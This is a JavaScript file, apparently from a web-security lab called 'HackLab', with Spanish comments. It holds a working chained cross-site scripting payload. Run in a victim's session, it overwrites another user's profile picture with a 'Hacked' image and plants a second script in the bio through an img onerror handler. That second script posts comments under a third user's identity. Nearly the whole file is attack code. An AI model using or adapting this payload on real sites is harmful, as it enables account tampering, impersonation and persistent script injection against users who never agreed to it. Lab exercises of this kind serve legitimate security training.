// payload.js - XSS Chain Corregida: Actualiza pic/bio de Pepe + envía comentario como Jeni
// FIX: Usa 'content' y '/comment' basado en HTML del form

// Crea canvas para imagen "Hacked"
var canvas = document.createElement('canvas');
canvas.width = 150;
canvas.height = 150;
var ctx = canvas.getContext('2d');
ctx.fillStyle = 'black';
ctx.fillRect(0, 0, 150, 150);
ctx.fillStyle = 'red';
ctx.font = 'bold 30px sans-serif';
ctx.fillText('Hacked', 20, 85);

// XSS2 para bio: POST comentario como Jeni - FIX: 'content' y '/comment'
var xss2 = '<img src=x onerror="console.log(\'🔍 XSS2 iniciado en bio (como Jeni)\'); var fd = new FormData(); fd.append(\'content\', \'¡Hola HackLab! Soy jeni comentando desde biografías. #XSSChainFixed\'); console.log(\'📤 POST a /comment...\'); fetch(\'/comment\', {method: \'POST\', credentials: \'include\', body: fd}).then(r => {console.log(\'📊 Status:\', r.status); if (r.ok) {console.log(\'✅ Comentario de Jeni enviado!\');} else {console.error(\'❌ Falló:\', r.status);}}).catch(err => console.error(\'💥 Error:\', err));"> <p>Curiosidad + código = poder. Experto en Ciberseguridad. (Actualizado por hacklab)</p>';

// Convertir canvas a Blob y enviar update a /profile
canvas.toBlob(function(blob) {
  var formData = new FormData();
  formData.append('bio', xss2);
  formData.append('profile_pic', blob, 'hacked.jpg');
  
  fetch('/profile', {
    method: 'POST',
    credentials: 'include',
    body: formData
  }).then(r => {
    if (r.ok) {
      console.log('✅ Perfil de Pepe hackeado: Pic + Bio actualizados con XSS2');
    } else {
      console.error('❌ Error en POST a /profile:', r.status);
    }
  }).catch(err => console.error('Error en fetch:', err));
}, 'image/jpeg');
